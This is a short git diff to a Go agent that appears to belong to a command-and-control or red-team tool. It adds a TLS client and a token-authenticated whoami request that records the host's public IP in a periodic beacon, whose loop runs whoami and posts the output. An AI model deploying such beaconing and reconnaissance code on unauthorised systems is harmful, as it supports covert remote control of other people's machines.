@@ -42,6 +42,19 @@ func main() {
 		Timeout:   10 * time.Second,
 	}
 
+	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
+	apiTLS := &tls.Config{
+		RootCAs:    caCertPool,
+		ServerName: "api.gla1v3.local",
+	}
+
+	whoamiClient := &http.Client{
+		Transport: &http.Transport{TLSClientConfig: apiTLS},
+		Timeout:   6 * time.Second,
+	}
+
+	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")
+
 	// 4. Beacon loop with whoami execution and JSON POST
 	agentID := "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
 
@@ -96,6 +109,34 @@ func main() {
 			"output":   output,
 			"error":    errStr,
 			"ts":       time.Now().UTC().Format(time.RFC3339),
+		}
+
+		// Attempt to learn public IP via secure whoami endpoint on the API
+		if whoamiToken != "" {
+			func() {
+				req, _ := http.NewRequest("GET", "https://api.gla1v3.local/whoami", nil)
+				req.Header.Set("Authorization", "Bearer "+whoamiToken)
+				req.Header.Set("User-Agent", "Gla1v3-Agent/0.1 whoami")
+				resp, err := whoamiClient.Do(req)
+				if err != nil {
+					log.Printf("whoami request failed: %v", err)
+					return
+				}
+				defer resp.Body.Close()
+				if resp.StatusCode != 200 {
+					log.Printf("whoami non-200: %s", resp.Status)
+					return
+				}
+				var j struct{ IP string `json:"ip"` }
+				if err := json.NewDecoder(resp.Body).Decode(&j); err != nil {
+					log.Printf("whoami decode failed: %v", err)
+					return
+				}
+				if j.IP != "" {
+					payload["publicIp"] = j.IP
+					log.Printf("whoami -> publicIp: %s", j.IP)
+				}
+			}()
 		}
 
 		bodyBytes, jerr := json.Marshal(payload)
